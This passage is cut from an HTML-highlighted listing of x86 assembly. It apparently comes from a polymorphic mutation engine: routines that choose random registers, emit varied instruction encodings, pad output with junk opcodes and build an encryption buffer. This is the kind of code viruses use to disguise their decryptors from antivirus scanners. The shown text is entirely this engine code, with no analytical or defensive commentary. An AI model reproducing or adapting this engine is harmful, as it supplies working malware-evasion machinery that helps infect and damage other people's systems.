</span><span class="sc5">GET_FREE_REG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">WREG_LIST</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:DIRTY_WREG</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">FILL_WREG_LIST</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">NO_VALID_WREG</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">NO_VALID_WREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FILL_WREG_LIST</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">USED_WREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_WREG</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">MOV_ZERO32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
</span><span class="sc5">MOV_ZERO16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MOV_WREG</span><span class="sc0">
</span><span class="sc5">MOV_AH</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">MOV_AX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_AX</span><span class="sc0">
</span><span class="sc1">;ECX=CONST,BL=REG NUM</span><span class="sc0">
</span><span class="sc1">;1. PUSH CONST (68/6A)/POP REG</span><span class="sc0">
</span><span class="sc1">;2. MOV REG,CONST (0B8H OR REG)</span><span class="sc0">
</span><span class="sc1">;3. XOR(SUB/MOV 0) REG/ADD(SUB NEG/OR/XOR)</span><span class="sc0">
</span><span class="sc5">MOV_WREG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
</span><span class="sc5">NULL_WREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_MOV_IMM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc0">              </span><span class="sc1">;PUSH IMM</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_SIGN</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">IS_IMM8</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">STORE32</span><span class="sc0">
</span><span class="sc5">IS_IMM8</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">58H</span><span class="sc0">              </span><span class="sc1">;POP WREG</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">USED_SHIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">USED_WREG</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_SHIT</span><span class="sc0">
</span><span class="sc5">IS_MOV_IMM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_MOV</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc0">             </span><span class="sc1">;MOV</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">SAVE_OPCODE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">STORE32</span><span class="sc0">
</span><span class="sc5">SET_USED</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">USED_SHIT</span><span class="sc0">
</span><span class="sc5">IS_MOV</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_CALL_MOV</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">NULL_WREG</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_WREG</span><span class="sc0">
</span><span class="sc5">NO_CALL_MOV</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CLEAR_XOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc4">-</span><span class="sc2">29H</span><span class="sc0">          </span><span class="sc1">;XOR</span><span class="sc0">
</span><span class="sc5">NO_CLEAR_XOR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1829H</span><span class="sc0">            </span><span class="sc1">;SUB</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">USED_SHIT</span><span class="sc0">
</span><span class="sc5">SET_WREG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">SET_USED</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0F0H</span><span class="sc0">             </span><span class="sc1">;XOR</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">IS_CASE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0C8H</span><span class="sc0">             </span><span class="sc1">;OR</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_CASE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">             </span><span class="sc1">;ADD</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_CASE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">             </span><span class="sc1">;SUB</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">IS_CASE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">81H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_SIGN</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SAVE_CONST</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CONST_SAVED</span><span class="sc0">
</span><span class="sc5">SAVE_CONST</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">STORE32</span><span class="sc0">
</span><span class="sc5">CONST_SAVED</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_SHIT</span><span class="sc0">

</span><span class="sc1">;-------------------------------------- </span><span class="sc0">
</span><span class="sc5">CHECK_SIGN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">7FH</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SET_EXT_BIT</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">80H</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">NO_SET_BIT</span><span class="sc0">
</span><span class="sc5">SET_EXT_BIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">NO_SET_BIT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">STORE32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BIT16</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">             </span><span class="sc1">;STOSD</span><span class="sc0">
</span><span class="sc5">BIT16</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_SHIT_32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_8</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_SIMPLE32</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">SIMPLE_OP</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc5">NO_SHIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_SHIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GET_SHIT_32</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">SHIT_FLAG</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">ALL_SHIT</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:DIRTY_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SIZE_SHIT</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">ALL_SHIT</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SIZE_LAST_SHIT</span><span class="sc0">
</span><span class="sc5">ALL_SHIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">PROC_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALL_RANDOM</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">SHIT_FLAG</span><span class="sc0">
</span><span class="sc5">NO_GET_SHIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">PUSH_SREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_VALID_SREG</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                </span><span class="sc1">;PUSH SREG</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_SHIT</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">ONE_SHIT</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_SIMPLE_OP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">SIMPLE_OP</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0CDH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc4">-</span><span class="sc2">34H</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">34H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_INT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">SMASHTOP_SHIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc4">,</span><span class="sc5">_DS</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_PREFIX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_VALID_SREG</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">26H</span><span class="sc0">              </span><span class="sc1">;ES:</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">NO_PREFIX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ENCRYPT</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
</span><span class="sc5">RAND_OFFSET</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">ENCRYPT_BUFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">'$'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">RAND_OFFSET</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">WAS_UNARE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">WAS_UNARE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">VIA_RETN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">IS_RETN</span><span class="sc0">             </span><span class="sc1">;IF 0C3H</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">              </span><span class="sc1">;MIN=1000H</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">IS_RETN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">AX_SHIT</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_AX_OP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">AX_OP</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RAND_WORD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
